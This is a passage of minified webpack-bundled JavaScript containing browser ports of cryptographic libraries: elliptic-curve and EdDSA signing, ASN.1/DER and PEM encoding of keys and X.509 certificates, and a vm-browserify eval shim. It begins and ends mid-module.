    e.exports = i, i.fromPublic = function(e, t, n) { return t instanceof i ? t : new i(e, { pub: t, pubEnc: n }) }, i.fromPrivate = function(e, t, n) { return t instanceof i ? t : new i(e, { priv: t, privEnc: n }) }, i.prototype.validate = function() { var e = this.getPublic(); return e.isInfinity() ? { result: !1, reason: "Invalid public key" } : e.validate() ? e.mul(this.ec.curve.n).isInfinity() ? { result: !0, reason: null } : { result: !1, reason: "Public key * N != O" } : { result: !1, reason: "Public key is not a point" } }, i.prototype.getPublic = function(e, t) { return "string" == typeof e && (t = e, e = null), this.pub || (this.pub = this.ec.g.mul(this.priv)), t ? this.pub.encode(t, e) : this.pub }, i.prototype.getPrivate = function(e) { return "hex" === e ? this.priv.toString(16, 2) : this.priv }, i.prototype._importPrivate = function(e, t) { this.priv = new r(e, t || 16), this.priv = this.priv.umod(this.ec.curve.n) }, i.prototype._importPublic = function(e, t) { if (e.x || e.y) return "mont" === this.ec.curve.type ? s(e.x, "Need x coordinate") : "short" !== this.ec.curve.type && "edwards" !== this.ec.curve.type || s(e.x && e.y, "Need both x and y coordinate"), void(this.pub = this.ec.curve.point(e.x, e.y));
        this.pub = this.ec.curve.decodePoint(e, t) }, i.prototype.derive = function(e) { return e.mul(this.priv).getX() }, i.prototype.sign = function(e, t, n) { return this.ec.sign(e, this, t, n) }, i.prototype.verify = function(e, t) { return this.ec.verify(e, t, this) }, i.prototype.inspect = function() { return "<Key priv: " + (this.priv && this.priv.toString(16, 2)) + " pub: " + (this.pub && this.pub.inspect()) + " >" } }, function(e, t, n) { "use strict";

    function i(e, t) { if (e instanceof i) return e;
        this._importDER(e, t) || (d(e.r && e.s, "Signature without r or s"), this.r = new c(e.r, 16), this.s = new c(e.s, 16), void 0 === e.recoveryParam ? this.recoveryParam = null : this.recoveryParam = e.recoveryParam) }

    function r() { this.place = 0 }

    function o(e, t) { var n = e[t.place++]; if (!(128 & n)) return n; for (var i = 15 & n, r = 0, o = 0, a = t.place; o < i; o++, a++) r <<= 8, r |= e[a]; return t.place = a, r }

    function a(e) { for (var t = 0, n = e.length - 1; !e[t] && !(128 & e[t + 1]) && t < n;) t++; return 0 === t ? e : e.slice(t) }

    function s(e, t) { if (t < 128) return void e.push(t); var n = 1 + (Math.log(t) / Math.LN2 >>> 3); for (e.push(128 | n); --n;) e.push(t >>> (n << 3) & 255);
        e.push(t) } var c = n(3),
        u = n(4),
        l = u.utils,
        d = l.assert;
    e.exports = i, i.prototype._importDER = function(e, t) { e = l.toArray(e, t); var n = new r; if (48 !== e[n.place++]) return !1; if (o(e, n) + n.place !== e.length) return !1; if (2 !== e[n.place++]) return !1; var i = o(e, n),
            a = e.slice(n.place, i + n.place); if (n.place += i, 2 !== e[n.place++]) return !1; var s = o(e, n); if (e.length !== s + n.place) return !1; var u = e.slice(n.place, s + n.place); return 0 === a[0] && 128 & a[1] && (a = a.slice(1)), 0 === u[0] && 128 & u[1] && (u = u.slice(1)), this.r = new c(a), this.s = new c(u), this.recoveryParam = null, !0 }, i.prototype.toDER = function(e) { var t = this.r.toArray(),
            n = this.s.toArray(); for (128 & t[0] && (t = [0].concat(t)), 128 & n[0] && (n = [0].concat(n)), t = a(t), n = a(n); !(n[0] || 128 & n[1]);) n = n.slice(1); var i = [2];
        s(i, t.length), i = i.concat(t), i.push(2), s(i, n.length); var r = i.concat(n),
            o = [48]; return s(o, r.length), o = o.concat(r), l.encode(o, e) } }, function(e, t, n) { "use strict";

    function i(e) { if (s("ed25519" === e, "only tested with ed25519 so far"), !(this instanceof i)) return new i(e); var e = o.curves[e].curve;
        this.curve = e, this.g = e.g, this.g.precompute(e.n.bitLength() + 1), this.pointClass = e.point().constructor, this.encodingLength = Math.ceil(e.n.bitLength() / 8), this.hash = r.sha512 } var r = n(36),
        o = n(4),
        a = o.utils,
        s = a.assert,
        c = a.parseBytes,
        u = n(140),
        l = n(141);
    e.exports = i, i.prototype.sign = function(e, t) { e = c(e); var n = this.keyFromSecret(t),
            i = this.hashInt(n.messagePrefix(), e),
            r = this.g.mul(i),
            o = this.encodePoint(r),
            a = this.hashInt(o, n.pubBytes(), e).mul(n.priv()),
            s = i.add(a).umod(this.curve.n); return this.makeSignature({ R: r, S: s, Rencoded: o }) }, i.prototype.verify = function(e, t, n) { e = c(e), t = this.makeSignature(t); var i = this.keyFromPublic(n),
            r = this.hashInt(t.Rencoded(), i.pubBytes(), e),
            o = this.g.mul(t.S()); return t.R().add(i.pub().mul(r)).eq(o) }, i.prototype.hashInt = function() { for (var e = this.hash(), t = 0; t < arguments.length; t++) e.update(arguments[t]); return a.intFromLE(e.digest()).umod(this.curve.n) }, i.prototype.keyFromPublic = function(e) { return u.fromPublic(this, e) }, i.prototype.keyFromSecret = function(e) { return u.fromSecret(this, e) }, i.prototype.makeSignature = function(e) { return e instanceof l ? e : new l(this, e) }, i.prototype.encodePoint = function(e) { var t = e.getY().toArray("le", this.encodingLength); return t[this.encodingLength - 1] |= e.getX().isOdd() ? 128 : 0, t }, i.prototype.decodePoint = function(e) { e = a.parseBytes(e); var t = e.length - 1,
            n = e.slice(0, t).concat(-129 & e[t]),
            i = 0 != (128 & e[t]),
            r = a.intFromLE(n); return this.curve.pointFromY(r, i) }, i.prototype.encodeInt = function(e) { return e.toArray("le", this.encodingLength) }, i.prototype.decodeInt = function(e) { return a.intFromLE(e) }, i.prototype.isPoint = function(e) { return e instanceof this.pointClass } }, function(e, t, n) { "use strict";

    function i(e, t) { this.eddsa = e, this._secret = s(t.secret), e.isPoint(t.pub) ? this._pub = t.pub : this._pubBytes = s(t.pub) } var r = n(4),
        o = r.utils,
        a = o.assert,
        s = o.parseBytes,
        c = o.cachedProperty;
    i.fromPublic = function(e, t) { return t instanceof i ? t : new i(e, { pub: t }) }, i.fromSecret = function(e, t) { return t instanceof i ? t : new i(e, { secret: t }) }, i.prototype.secret = function() { return this._secret }, c(i, "pubBytes", function() { return this.eddsa.encodePoint(this.pub()) }), c(i, "pub", function() { return this._pubBytes ? this.eddsa.decodePoint(this._pubBytes) : this.eddsa.g.mul(this.priv()) }), c(i, "privBytes", function() { var e = this.eddsa,
            t = this.hash(),
            n = e.encodingLength - 1,
            i = t.slice(0, e.encodingLength); return i[0] &= 248, i[n] &= 127, i[n] |= 64, i }), c(i, "priv", function() { return this.eddsa.decodeInt(this.privBytes()) }), c(i, "hash", function() { return this.eddsa.hash().update(this.secret()).digest() }), c(i, "messagePrefix", function() { return this.hash().slice(this.eddsa.encodingLength) }), i.prototype.sign = function(e) { return a(this._secret, "KeyPair can only verify"), this.eddsa.sign(e, this) }, i.prototype.verify = function(e, t) { return this.eddsa.verify(e, t, this) }, i.prototype.getSecret = function(e) { return a(this._secret, "KeyPair is public only"), o.encode(this.secret(), e) }, i.prototype.getPublic = function(e) { return o.encode(this.pubBytes(), e) }, e.exports = i }, function(e, t, n) { "use strict";

    function i(e, t) { this.eddsa = e, "object" != typeof t && (t = u(t)), Array.isArray(t) && (t = { R: t.slice(0, e.encodingLength), S: t.slice(e.encodingLength) }), s(t.R && t.S, "Signature without R or S"), e.isPoint(t.R) && (this._R = t.R), t.S instanceof r && (this._S = t.S), this._Rencoded = Array.isArray(t.R) ? t.R : t.Rencoded, this._Sencoded = Array.isArray(t.S) ? t.S : t.Sencoded } var r = n(3),
        o = n(4),
        a = o.utils,
        s = a.assert,
        c = a.cachedProperty,
        u = a.parseBytes;
    c(i, "S", function() { return this.eddsa.decodeInt(this.Sencoded()) }), c(i, "R", function() { return this.eddsa.decodePoint(this.Rencoded()) }), c(i, "Rencoded", function() { return this.eddsa.encodePoint(this.R()) }), c(i, "Sencoded", function() { return this.eddsa.encodeInt(this.S()) }), i.prototype.toBytes = function() { return this.Rencoded().concat(this.Sencoded()) }, i.prototype.toHex = function() { return a.encode(this.toBytes(), "hex").toUpperCase() }, e.exports = i }, function(e, t, n) { "use strict"; var i = n(17);
    t.certificate = n(153); var r = i.define("RSAPrivateKey", function() { this.seq().obj(this.key("version").int(), this.key("modulus").int(), this.key("publicExponent").int(), this.key("privateExponent").int(), this.key("prime1").int(), this.key("prime2").int(), this.key("exponent1").int(), this.key("exponent2").int(), this.key("coefficient").int()) });
    t.RSAPrivateKey = r; var o = i.define("RSAPublicKey", function() { this.seq().obj(this.key("modulus").int(), this.key("publicExponent").int()) });
    t.RSAPublicKey = o; var a = i.define("SubjectPublicKeyInfo", function() { this.seq().obj(this.key("algorithm").use(s), this.key("subjectPublicKey").bitstr()) });
    t.PublicKey = a; var s = i.define("AlgorithmIdentifier", function() { this.seq().obj(this.key("algorithm").objid(), this.key("none").null_().optional(), this.key("curve").objid().optional(), this.key("params").seq().obj(this.key("p").int(), this.key("q").int(), this.key("g").int()).optional()) }),
        c = i.define("PrivateKeyInfo", function() { this.seq().obj(this.key("version").int(), this.key("algorithm").use(s), this.key("subjectPrivateKey").octstr()) });
    t.PrivateKey = c; var u = i.define("EncryptedPrivateKeyInfo", function() { this.seq().obj(this.key("algorithm").seq().obj(this.key("id").objid(), this.key("decrypt").seq().obj(this.key("kde").seq().obj(this.key("id").objid(), this.key("kdeparams").seq().obj(this.key("salt").octstr(), this.key("iters").int())), this.key("cipher").seq().obj(this.key("algo").objid(), this.key("iv").octstr()))), this.key("subjectPrivateKey").octstr()) });
    t.EncryptedPrivateKey = u; var l = i.define("DSAPrivateKey", function() { this.seq().obj(this.key("version").int(), this.key("p").int(), this.key("q").int(), this.key("g").int(), this.key("pub_key").int(), this.key("priv_key").int()) });
    t.DSAPrivateKey = l, t.DSAparam = i.define("DSAparam", function() { this.int() }); var d = i.define("ECPrivateKey", function() { this.seq().obj(this.key("version").int(), this.key("privateKey").octstr(), this.key("parameters").optional().explicit(0).use(f), this.key("publicKey").optional().explicit(1).bitstr()) });
    t.ECPrivateKey = d; var f = i.define("ECParameters", function() { this.choice({ namedCurve: this.objid() }) });
    t.signature = i.define("signature", function() { this.seq().obj(this.key("r").int(), this.key("s").int()) }) }, function(e, t, n) {
    function i(e, t) { this.name = e, this.body = t, this.decoders = {}, this.encoders = {} } var r = n(17),
        o = n(0);
    t.define = function(e, t) { return new i(e, t) }, i.prototype._createNamed = function(e) { var t; try { t = n(144).runInThisContext("(function " + this.name + "(entity) {\n  this._initNamed(entity);\n})") } catch (e) { t = function(e) { this._initNamed(e) } } return o(t, e), t.prototype._initNamed = function(t) { e.call(this, t) }, new t(this) }, i.prototype._getDecoder = function(e) { return e = e || "der", this.decoders.hasOwnProperty(e) || (this.decoders[e] = this._createNamed(r.decoders[e])), this.decoders[e] }, i.prototype.decode = function(e, t, n) { return this._getDecoder(t).decode(e, n) }, i.prototype._getEncoder = function(e) { return e = e || "der", this.encoders.hasOwnProperty(e) || (this.encoders[e] = this._createNamed(r.encoders[e])), this.encoders[e] }, i.prototype.encode = function(e, t, n) { return this._getEncoder(t).encode(e, n) } }, function(module, exports, __webpack_require__) {
    function Context() {} var indexOf = __webpack_require__(145),
        Object_keys = function(e) { if (Object.keys) return Object.keys(e); var t = []; for (var n in e) t.push(n); return t },
        forEach = function(e, t) { if (e.forEach) return e.forEach(t); for (var n = 0; n < e.length; n++) t(e[n], n, e) },
        defineProp = function() { try { return Object.defineProperty({}, "_", {}),
                    function(e, t, n) { Object.defineProperty(e, t, { writable: !0, enumerable: !1, configurable: !0, value: n }) } } catch (e) { return function(e, t, n) { e[t] = n } } }(),
        globals = ["Array", "Boolean", "Date", "Error", "EvalError", "Function", "Infinity", "JSON", "Math", "NaN", "Number", "Object", "RangeError", "ReferenceError", "RegExp", "String", "SyntaxError", "TypeError", "URIError", "decodeURI", "decodeURIComponent", "encodeURI", "encodeURIComponent", "escape", "eval", "isFinite", "isNaN", "parseFloat", "parseInt", "undefined", "unescape"];
    Context.prototype = {}; var Script = exports.Script = function(e) { if (!(this instanceof Script)) return new Script(e);
        this.code = e };
    Script.prototype.runInContext = function(e) { if (!(e instanceof Context)) throw new TypeError("needs a 'context' argument."); var t = document.createElement("iframe");
        t.style || (t.style = {}), t.style.display = "none", document.body.appendChild(t); var n = t.contentWindow,
            i = n.eval,
            r = n.execScript;!i && r && (r.call(n, "null"), i = n.eval), forEach(Object_keys(e), function(t) { n[t] = e[t] }), forEach(globals, function(t) { e[t] && (n[t] = e[t]) }); var o = Object_keys(n),
            a = i.call(n, this.code); return forEach(Object_keys(n), function(t) {
            (t in e || -1 === indexOf(o, t)) && (e[t] = n[t]) }), forEach(globals, function(t) { t in e || defineProp(e, t, n[t]) }), document.body.removeChild(t), a }, Script.prototype.runInThisContext = function() { return eval(this.code) }, Script.prototype.runInNewContext = function(e) { var t = Script.createContext(e),
            n = this.runInContext(t); return forEach(Object_keys(t), function(n) { e[n] = t[n] }), n }, forEach(Object_keys(Script.prototype), function(e) { exports[e] = Script[e] = function(t) { var n = Script(t); return n[e].apply(n, [].slice.call(arguments, 1)) } }), exports.createScript = function(e) { return exports.Script(e) }, exports.createContext = Script.createContext = function(e) { var t = new Context; return "object" == typeof e && forEach(Object_keys(e), function(n) { t[n] = e[n] }), t } }, function(e, t) { var n = [].indexOf;
    e.exports = function(e, t) { if (n) return e.indexOf(t); for (var i = 0; i < e.length; ++i)
            if (e[i] === t) return i; return -1 } }, function(e, t, n) {
    function i(e) { this._reporterState = { obj: null, path: [], options: e || {}, errors: [] } }

    function r(e, t) { this.path = e, this.rethrow(t) } var o = n(0);
    t.Reporter = i, i.prototype.isError = function(e) { return e instanceof r }, i.prototype.save = function() { var e = this._reporterState; return { obj: e.obj, pathLen: e.path.length } }, i.prototype.restore = function(e) { var t = this._reporterState;
        t.obj = e.obj, t.path = t.path.slice(0, e.pathLen) }, i.prototype.enterKey = function(e) { return this._reporterState.path.push(e) }, i.prototype.exitKey = function(e) { var t = this._reporterState;
        t.path = t.path.slice(0, e - 1) }, i.prototype.leaveKey = function(e, t, n) { var i = this._reporterState;
        this.exitKey(e), null !== i.obj && (i.obj[t] = n) }, i.prototype.path = function() { return this._reporterState.path.join("/") }, i.prototype.enterObject = function() { var e = this._reporterState,
            t = e.obj; return e.obj = {}, t }, i.prototype.leaveObject = function(e) { var t = this._reporterState,
            n = t.obj; return t.obj = e, n }, i.prototype.error = function(e) { var t, n = this._reporterState,
            i = e instanceof r; if (t = i ? e : new r(n.path.map(function(e) { return "[" + JSON.stringify(e) + "]" }).join(""), e.message || e, e.stack), !n.options.partial) throw t; return i || n.errors.push(t), t }, i.prototype.wrapResult = function(e) { var t = this._reporterState; return t.options.partial ? { result: this.isError(e) ? null : e, errors: t.errors } : e }, o(r, Error), r.prototype.rethrow = function(e) { if (this.message = e + " at: " + (this.path || "(shallow)"), Error.captureStackTrace && Error.captureStackTrace(this, r), !this.stack) try { throw new Error(this.message) } catch (e) { this.stack = e.stack }
        return this } }, function(e, t, n) {
    function i(e, t) { var n = {};
        this._baseState = n, n.enc = e, n.parent = t || null, n.children = null, n.tag = null, n.args = null, n.reverseArgs = null, n.choice = null, n.optional = !1, n.any = !1, n.obj = !1, n.use = null, n.useDecoder = null, n.key = null, n.default = null, n.explicit = null, n.implicit = null, n.contains = null, n.parent || (n.children = [], this._wrap()) } var r = n(18).Reporter,
        o = n(18).EncoderBuffer,
        a = n(18).DecoderBuffer,
        s = n(5),
        c = ["seq", "seqof", "set", "setof", "objid", "bool", "gentime", "utctime", "null_", "enum", "int", "objDesc", "bitstr", "bmpstr", "charstr", "genstr", "graphstr", "ia5str", "iso646str", "numstr", "octstr", "printstr", "t61str", "unistr", "utf8str", "videostr"],
        u = ["key", "obj", "use", "optional", "explicit", "implicit", "def", "choice", "any", "contains"].concat(c),
        l = ["_peekTag", "_decodeTag", "_use", "_decodeStr", "_decodeObjid", "_decodeTime", "_decodeNull", "_decodeInt", "_decodeBool", "_decodeList", "_encodeComposite", "_encodeStr", "_encodeObjid", "_encodeTime", "_encodeNull", "_encodeInt", "_encodeBool"];
    e.exports = i; var d = ["enc", "parent", "children", "tag", "args", "reverseArgs", "choice", "optional", "any", "obj", "use", "alteredUse", "key", "default", "explicit", "implicit", "contains"];
    i.prototype.clone = function() { var e = this._baseState,
            t = {};
        d.forEach(function(n) { t[n] = e[n] }); var n = new this.constructor(t.parent); return n._baseState = t, n }, i.prototype._wrap = function() { var e = this._baseState;
        u.forEach(function(t) { this[t] = function() { var n = new this.constructor(this); return e.children.push(n), n[t].apply(n, arguments) } }, this) }, i.prototype._init = function(e) { var t = this._baseState;
        s(null === t.parent), e.call(this), t.children = t.children.filter(function(e) { return e._baseState.parent === this }, this), s.equal(t.children.length, 1, "Root node can have only one child") }, i.prototype._useArgs = function(e) { var t = this._baseState,
            n = e.filter(function(e) { return e instanceof this.constructor }, this);
        e = e.filter(function(e) { return !(e instanceof this.constructor) }, this), 0 !== n.length && (s(null === t.children), t.children = n, n.forEach(function(e) { e._baseState.parent = this }, this)), 0 !== e.length && (s(null === t.args), t.args = e, t.reverseArgs = e.map(function(e) { if ("object" != typeof e || e.constructor !== Object) return e; var t = {}; return Object.keys(e).forEach(function(n) { n == (0 | n) && (n |= 0); var i = e[n];
                t[i] = n }), t })) }, l.forEach(function(e) { i.prototype[e] = function() { var t = this._baseState; throw new Error(e + " not implemented for encoding: " + t.enc) } }), c.forEach(function(e) { i.prototype[e] = function() { var t = this._baseState,
                n = Array.prototype.slice.call(arguments); return s(null === t.tag), t.tag = e, this._useArgs(n), this } }), i.prototype.use = function(e) { s(e); var t = this._baseState; return s(null === t.use), t.use = e, this }, i.prototype.optional = function() { return this._baseState.optional = !0, this }, i.prototype.def = function(e) { var t = this._baseState; return s(null === t.default), t.default = e, t.optional = !0, this }, i.prototype.explicit = function(e) { var t = this._baseState; return s(null === t.explicit && null === t.implicit), t.explicit = e, this }, i.prototype.implicit = function(e) { var t = this._baseState; return s(null === t.explicit && null === t.implicit), t.implicit = e, this }, i.prototype.obj = function() { var e = this._baseState,
            t = Array.prototype.slice.call(arguments); return e.obj = !0, 0 !== t.length && this._useArgs(t), this }, i.prototype.key = function(e) { var t = this._baseState; return s(null === t.key), t.key = e, this }, i.prototype.any = function() { return this._baseState.any = !0, this }, i.prototype.choice = function(e) { var t = this._baseState; return s(null === t.choice), t.choice = e, this._useArgs(Object.keys(e).map(function(t) { return e[t] })), this }, i.prototype.contains = function(e) { var t = this._baseState; return s(null === t.use), t.contains = e, this }, i.prototype._decode = function(e, t) { var n = this._baseState; if (null === n.parent) return e.wrapResult(n.children[0]._decode(e, t)); var i = n.default,
            r = !0,
            o = null; if (null !== n.key && (o = e.enterKey(n.key)), n.optional) { var s = null; if (null !== n.explicit ? s = n.explicit : null !== n.implicit ? s = n.implicit : null !== n.tag && (s = n.tag), null !== s || n.any) { if (r = this._peekTag(e, s, n.any), e.isError(r)) return r } else { var c = e.save(); try { null === n.choice ? this._decodeGeneric(n.tag, e, t) : this._decodeChoice(e, t), r = !0 } catch (e) { r = !1 } e.restore(c) } } var u; if (n.obj && r && (u = e.enterObject()), r) { if (null !== n.explicit) { var l = this._decodeTag(e, n.explicit); if (e.isError(l)) return l;
                e = l } var d = e.offset; if (null === n.use && null === n.choice) { if (n.any) var c = e.save(); var f = this._decodeTag(e, null !== n.implicit ? n.implicit : n.tag, n.any); if (e.isError(f)) return f;
                n.any ? i = e.raw(c) : e = f } if (t && t.track && null !== n.tag && t.track(e.path(), d, e.length, "tagged"), t && t.track && null !== n.tag && t.track(e.path(), e.offset, e.length, "content"), i = n.any ? i : null === n.choice ? this._decodeGeneric(n.tag, e, t) : this._decodeChoice(e, t), e.isError(i)) return i; if (n.any || null !== n.choice || null === n.children || n.children.forEach(function(n) { n._decode(e, t) }), n.contains && ("octstr" === n.tag || "bitstr" === n.tag)) { var h = new a(i);
                i = this._getUse(n.contains, e._reporterState.obj)._decode(h, t) } } return n.obj && r && (i = e.leaveObject(u)), null === n.key || null === i && !0 !== r ? null !== o && e.exitKey(o) : e.leaveKey(o, n.key, i), i }, i.prototype._decodeGeneric = function(e, t, n) { var i = this._baseState; return "seq" === e || "set" === e ? null : "seqof" === e || "setof" === e ? this._decodeList(t, e, i.args[0], n) : /str$/.test(e) ? this._decodeStr(t, e, n) : "objid" === e && i.args ? this._decodeObjid(t, i.args[0], i.args[1], n) : "objid" === e ? this._decodeObjid(t, null, null, n) : "gentime" === e || "utctime" === e ? this._decodeTime(t, e, n) : "null_" === e ? this._decodeNull(t, n) : "bool" === e ? this._decodeBool(t, n) : "objDesc" === e ? this._decodeStr(t, e, n) : "int" === e || "enum" === e ? this._decodeInt(t, i.args && i.args[0], n) : null !== i.use ? this._getUse(i.use, t._reporterState.obj)._decode(t, n) : t.error("unknown tag: " + e) }, i.prototype._getUse = function(e, t) { var n = this._baseState; return n.useDecoder = this._use(e, t), s(null === n.useDecoder._baseState.parent), n.useDecoder = n.useDecoder._baseState.children[0], n.implicit !== n.useDecoder._baseState.implicit && (n.useDecoder = n.useDecoder.clone(), n.useDecoder._baseState.implicit = n.implicit), n.useDecoder }, i.prototype._decodeChoice = function(e, t) { var n = this._baseState,
            i = null,
            r = !1; return Object.keys(n.choice).some(function(o) { var a = e.save(),
                s = n.choice[o]; try { var c = s._decode(e, t); if (e.isError(c)) return !1;
                i = { type: o, value: c }, r = !0 } catch (t) { return e.restore(a), !1 } return !0 }, this), r ? i : e.error("Choice not matched") }, i.prototype._createEncoderBuffer = function(e) { return new o(e, this.reporter) }, i.prototype._encode = function(e, t, n) { var i = this._baseState; if (null === i.default || i.default !== e) { var r = this._encodeValue(e, t, n); if (void 0 !== r && !this._skipDefault(r, t, n)) return r } }, i.prototype._encodeValue = function(e, t, n) { var i = this._baseState; if (null === i.parent) return i.children[0]._encode(e, t || new r); var o = null; if (this.reporter = t, i.optional && void 0 === e) { if (null === i.default) return;
            e = i.default } var a = null,
            s = !1; if (i.any) o = this._createEncoderBuffer(e);
        else if (i.choice) o = this._encodeChoice(e, t);
        else if (i.contains) a = this._getUse(i.contains, n)._encode(e, t), s = !0;
        else if (i.children) a = i.children.map(function(n) { if ("null_" === n._baseState.tag) return n._encode(null, t, e); if (null === n._baseState.key) return t.error("Child should have a key"); var i = t.enterKey(n._baseState.key); if ("object" != typeof e) return t.error("Child expected, but input is not object"); var r = n._encode(e[n._baseState.key], t, e); return t.leaveKey(i), r }, this).filter(function(e) { return e }), a = this._createEncoderBuffer(a);
        else if ("seqof" === i.tag || "setof" === i.tag) { if (!i.args || 1 !== i.args.length) return t.error("Too many args for : " + i.tag); if (!Array.isArray(e)) return t.error("seqof/setof, but data is not Array"); var c = this.clone();
            c._baseState.implicit = null, a = this._createEncoderBuffer(e.map(function(n) { var i = this._baseState; return this._getUse(i.args[0], e)._encode(n, t) }, c)) } else null !== i.use ? o = this._getUse(i.use, n)._encode(e, t) : (a = this._encodePrimitive(i.tag, e), s = !0); var o; if (!i.any && null === i.choice) { var u = null !== i.implicit ? i.implicit : i.tag,
                l = null === i.implicit ? "universal" : "context";
            null === u ? null === i.use && t.error("Tag could be omitted only for .use()") : null === i.use && (o = this._encodeComposite(u, s, l, a)) } return null !== i.explicit && (o = this._encodeComposite(i.explicit, !1, "context", o)), o }, i.prototype._encodeChoice = function(e, t) { var n = this._baseState,
            i = n.choice[e.type]; return i || s(!1, e.type + " not found in " + JSON.stringify(Object.keys(n.choice))), i._encode(e.value, t) }, i.prototype._encodePrimitive = function(e, t) { var n = this._baseState; if (/str$/.test(e)) return this._encodeStr(t, e); if ("objid" === e && n.args) return this._encodeObjid(t, n.reverseArgs[0], n.args[1]); if ("objid" === e) return this._encodeObjid(t, null, null); if ("gentime" === e || "utctime" === e) return this._encodeTime(t, e); if ("null_" === e) return this._encodeNull(); if ("int" === e || "enum" === e) return this._encodeInt(t, n.args && n.reverseArgs[0]); if ("bool" === e) return this._encodeBool(t); if ("objDesc" === e) return this._encodeStr(t, e); throw new Error("Unsupported tag: " + e) }, i.prototype._isNumstr = function(e) { return /^[0-9 ]*$/.test(e) }, i.prototype._isPrintstr = function(e) { return /^[A-Za-z0-9 '\(\)\+,\-\.\/:=\?]*$/.test(e) } }, function(e, t, n) { var i = n(63);
    t.tagClass = { 0: "universal", 1: "application", 2: "context", 3: "private" }, t.tagClassByName = i._reverse(t.tagClass), t.tag = { 0: "end", 1: "bool", 2: "int", 3: "bitstr", 4: "octstr", 5: "null_", 6: "objid", 7: "objDesc", 8: "external", 9: "real", 10: "enum", 11: "embed", 12: "utf8str", 13: "relativeOid", 16: "seq", 17: "set", 18: "numstr", 19: "printstr", 20: "t61str", 21: "videostr", 22: "ia5str", 23: "utctime", 24: "gentime", 25: "graphstr", 26: "iso646str", 27: "genstr", 28: "unistr", 29: "charstr", 30: "bmpstr" }, t.tagByName = i._reverse(t.tag) }, function(e, t, n) { var i = t;
    i.der = n(64), i.pem = n(150) }, function(e, t, n) {
    function i(e) { a.call(this, e), this.enc = "pem" } var r = n(0),
        o = n(2).Buffer,
        a = n(64);
    r(i, a), e.exports = i, i.prototype.decode = function(e, t) { for (var n = e.toString().split(/[\r\n]+/g), i = t.label.toUpperCase(), r = /^-----(BEGIN|END) ([^-]+)-----$/, s = -1, c = -1, u = 0; u < n.length; u++) { var l = n[u].match(r); if (null !== l && l[2] === i) { if (-1 !== s) { if ("END" !== l[1]) break;
                    c = u; break } if ("BEGIN" !== l[1]) break;
                s = u } } if (-1 === s || -1 === c) throw new Error("PEM section not found for: " + i); var d = n.slice(s + 1, c).join("");
        d.replace(/[^a-z0-9\+\/=]+/gi, ""); var f = new o(d, "base64"); return a.prototype.decode.call(this, f, t) } }, function(e, t, n) { var i = t;
    i.der = n(65), i.pem = n(152) }, function(e, t, n) {
    function i(e) { o.call(this, e), this.enc = "pem" } var r = n(0),
        o = n(65);
    r(i, o), e.exports = i, i.prototype.encode = function(e, t) { for (var n = o.prototype.encode.call(this, e), i = n.toString("base64"), r = ["-----BEGIN " + t.label + "-----"], a = 0; a < i.length; a += 64) r.push(i.slice(a, a + 64)); return r.push("-----END " + t.label + "-----"), r.join("\n") } }, function(e, t, n) { "use strict"; var i = n(17),
        r = i.define("Time", function() { this.choice({ utcTime: this.utctime(), generalTime: this.gentime() }) }),
        o = i.define("AttributeTypeValue", function() { this.seq().obj(this.key("type").objid(), this.key("value").any()) }),
        a = i.define("AlgorithmIdentifier", function() { this.seq().obj(this.key("algorithm").objid(), this.key("parameters").optional()) }),
        s = i.define("SubjectPublicKeyInfo", function() { this.seq().obj(this.key("algorithm").use(a), this.key("subjectPublicKey").bitstr()) }),
        c = i.define("RelativeDistinguishedName", function() { this.setof(o) }),
        u = i.define("RDNSequence", function() { this.seqof(c) }),
        l = i.define("Name", function() { this.choice({ rdnSequence: this.use(u) }) }),
        d = i.define("Validity", function() { this.seq().obj(this.key("notBefore").use(r), this.key("notAfter").use(r)) }),
        f = i.define("Extension", function() { this.seq().obj(this.key("extnID").objid(), this.key("critical").bool().def(!1), this.key("extnValue").octstr()) }),
        h = i.define("TBSCertificate", function() { this.seq().obj(this.key("version").explicit(0).int(), this.key("serialNumber").int(), this.key("signature").use(a), this.key("issuer").use(l), this.key("validity").use(d), this.key("subject").use(l), this.key("subjectPublicKeyInfo").use(s), this.key("issuerUniqueID").implicit(1).bitstr().optional(), this.key("subjectUniqueID").implicit(2).bitstr().optional(), this.key("extensions").explicit(3).seqof(f).optional()) }),
        p = i.define("X509Certificate", function() { this.seq().obj(this.key("tbsCertificate").use(h), this.key("signatureAlgorithm").use(a), this.key("signatureValue").bitstr()) });
    e.exports = p }, function(e, t) { e.exports = { "2.16.840.1.101.3.4.1.1": "aes-128-ecb", "2.16.840.1.101.3.4.1.2": "aes-128-cbc", "2.16.840.1.101.3.4.1.3": "aes-128-ofb", "2.16.840.1.101.3.4.1.4": "aes-128-cfb", "2.16.840.1.101.3.4.1.21": "aes-192-ecb", "2.16.840.1.101.3.4.1.22": "aes-192-cbc", "2.16.840.1.101.3.4.1.23": "aes-192-ofb", "2.16.840.1.101.3.4.1.24": "aes-192-cfb", "2.16.840.1.101.3.4.1.41": "aes-256-ecb", "2.16.840.1.101.3.4.1.42": "aes-256-cbc", "2.16.840.1.101.3.4.1.43": "aes-256-ofb", "2.16.840.1.101.3.4.1.44": "aes-256-cfb" } }, function(e, t, n) {
    (function(t) { var i = /Proc-Type: 4,ENCRYPTED\n\r?DEK-Info: AES-((?:128)|(?:192)|(?:256))-CBC,([0-9A-H]+)\n\r?\n\r?([0-9A-z\n\r\+\/\=]+)\n\r?/m,
            r = /^-----BEGIN ((?:.* KEY)|CERTIFICATE)-----\n/m,
            o = /^-----BEGIN ((?:.* KEY)|CERTIFICATE)-----\n\r?([0-9A-z\n\r\+\/\=]+)\n\r?-----END \1-----$/m,
            a = n(21),
            s = n(32);
        e.exports = function(e, n) { var c, u = e.toString(),
                l = u.match(i); if (l) { var d = "aes" + l[1],
                    f = new t(l[2], "hex"),
                    h = new t(l[3].replace(/\r?\n/g, ""), "base64"),
                    p = a(n, f.slice(0, 8), parseInt(l[1], 10)).key,
                    b = [],
                    m = s.createDecipheriv(d, p, f);
                b.push(m.update(h)), b.push(m.final()), c = t.concat(b) } else { var g = u.match(o);
                c = new t(g[2].replace(/\r?\n/g, ""), "base64") } return { tag: u.match(r)[1], data: c } } }).call(t, n(2).Buffer) }, function(e, t, n) {
    (function(t) {
        function i(e, n, i, a, c) { var l = u(i); if ("ec" === l.type) { if ("ecdsa" !== a && "ecdsa/rsa" !== a) throw new Error("wrong public key type"); return r(e, n, l) } if ("dsa" === l.type) { if ("dsa" !== a) throw new Error("wrong public key type"); return o(e, n, l) } if ("rsa" !== a && "ecdsa/rsa" !== a) throw new Error("wrong public key type");
            n = t.concat([c, n]); for (var d = l.modulus.byteLength(), f = [1], h = 0; n.length + f.length + 2 < d;) f.push(255), h++;
